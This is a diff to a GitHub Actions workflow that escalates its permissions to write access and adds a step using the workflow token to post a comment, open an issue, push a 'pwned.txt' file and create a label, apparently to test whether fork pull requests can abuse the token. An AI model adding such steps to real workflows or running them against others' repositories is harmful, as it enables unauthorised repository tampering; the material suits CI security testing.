@@ -6,8 +6,9 @@ on:
 name: check-changes
 
 permissions:
-  contents: read
-  pull-requests: write  # escalated - attacker wants write perms
+  contents: write
+  pull-requests: write
+  issues: write
 
 jobs:
   check:
@@ -18,15 +19,40 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Did we get the token? (malicious step injected by fork PR)
-        run: |
-          if [ -n "$GITHUB_TOKEN" ]; then
-            echo "GOT TOKEN (length=${#GITHUB_TOKEN})"
-          else
-            echo "NO TOKEN - fork isolation works"
-          fi
+      - name: Attempt write operations with fork token
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR: ${{ github.event.pull_request.number }}
+        run: |
+          echo "=== Attempting write operations with fork PR token ==="
+
+          echo "--- post PR comment ---"
+          gh api repos/$REPO/issues/$PR/comments \
+            --method POST --field body="pwned by fork token" \
+            && echo "SUCCEEDED: posted comment" \
+            || echo "FAILED: could not post comment"
+
+          echo "--- create issue ---"
+          gh api repos/$REPO/issues \
+            --method POST --field title="fork token test" --field body="created by malicious fork PR" \
+            && echo "SUCCEEDED: created issue" \
+            || echo "FAILED: could not create issue"
+
+          echo "--- push file via contents API ---"
+          CONTENT=$(echo "pwned" | base64 -w0)
+          gh api repos/$REPO/contents/pwned.txt \
+            --method PUT \
+            --field message="fork token pwn attempt" \
+            --field content="$CONTENT" \
+            && echo "SUCCEEDED: pushed file" \
+            || echo "FAILED: could not push file"
+
+          echo "--- create label ---"
+          gh api repos/$REPO/labels \
+            --method POST --field name="fork-pwned" --field color="ff0000" \
+            && echo "SUCCEEDED: created label" \
+            || echo "FAILED: could not create label"
 
       - name: Run change file check
         uses: OpenShock/release-tool@v0.1.0-alpha.5
